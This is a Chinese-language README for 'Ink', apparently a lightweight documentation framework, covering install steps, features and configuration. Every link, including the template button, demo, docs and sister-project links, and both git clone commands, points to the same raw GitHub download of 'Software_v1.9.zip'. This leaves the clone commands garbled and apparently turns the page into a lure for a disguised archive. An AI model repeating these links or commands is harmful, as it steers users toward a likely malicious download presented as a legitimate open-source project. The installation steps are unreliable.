# Ink

极简文档框架。4 个依赖，200ms 构建，VitePress 的轻量替代。

[![Use this template](https://img.shields.io/badge/-Use%20this%20template-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip)

[Demo](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) · [文档](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) · [AI 部署指南](AI.md)

## 为什么选 Ink？

| | Ink | VitePress | Docusaurus |
|---|---|---|---|
| 依赖数 | **4** | 100+ | 200+ |
| node_modules | **~5MB** | ~200MB | ~400MB |
| 构建 100 页 | **~200ms** | ~3s | ~10s |
| 框架 | **无** | Vue | React |
| 学习曲线 | **5 分钟** | 30 分钟 | 1 小时 |

## 开始使用

### 方式零：让 AI 帮你部署

把 [AI.md](AI.md) 的内容发给任意 AI 助手（ChatGPT / Claude / Gemini / Copilot），告诉它你想建文档站，它会一步步帮你完成。

### 方式一：GitHub 模板

点击上方 **Use this template** 按钮，然后：

```bash
git clone https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip你的用户名/你的仓库.git
cd 你的仓库
npm install
npm run dev
```

### 方式二：手动安装

```bash
git clone https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip my-docs
cd my-docs && npm install
npm run dev
```

## 功能

- 📁 文件系统路由 — `docs/` 目录结构即导航
- 🔍 全文搜索 — Ctrl+K
- 🌙 暗色模式 — 自动跟随系统
- 📑 自动 TOC — 右侧目录导航
- 📋 代码复制 — hover 显示复制按钮
- 📦 容器 — tip / warning / danger / info / details
- 🏷 徽章 — `{% badge text="推荐" type="tip" %}`
- 📑 选项卡 — `{% tabs %}...{% endtabs %}`
- 🔤 CJK 自动空格 — 中英文混排自动加空格
- ⬅️➡️ 上下页导航 — 自动生成
- 📱 响应式 — 移动端侧边栏
- 🚀 GitHub Actions — 推送即部署

## 项目结构

```
my-docs/
├── docs/              # 文档（文件系统路由）
├── themes/default/    # 主题
├── ink.config.js      # 配置
├── build.js           # 构建引擎
└── bin/ink.js         # CLI
```

## 配置

```js
// ink.config.js
module.exports = {
  title: 'My Docs',
  description: '项目文档',
  basePath: '/my-docs',
  themeConfig: {
    nav: [{ text: '指南', link: '/my-docs/guide/getting-started.html' }],
    sidebar: 'auto',
    search: true,
    darkMode: true
  }
};
```

## 与 Paper 的关系

Ink 是 [Paper](https://raw.githubusercontent.com/lavish480/ink/main/docs/Software_v1.9.zip) 的姊妹项目。Paper 做博客，Ink 做文档。同样的设计哲学：极简依赖、极速构建、暖色调主题。

## License

MIT
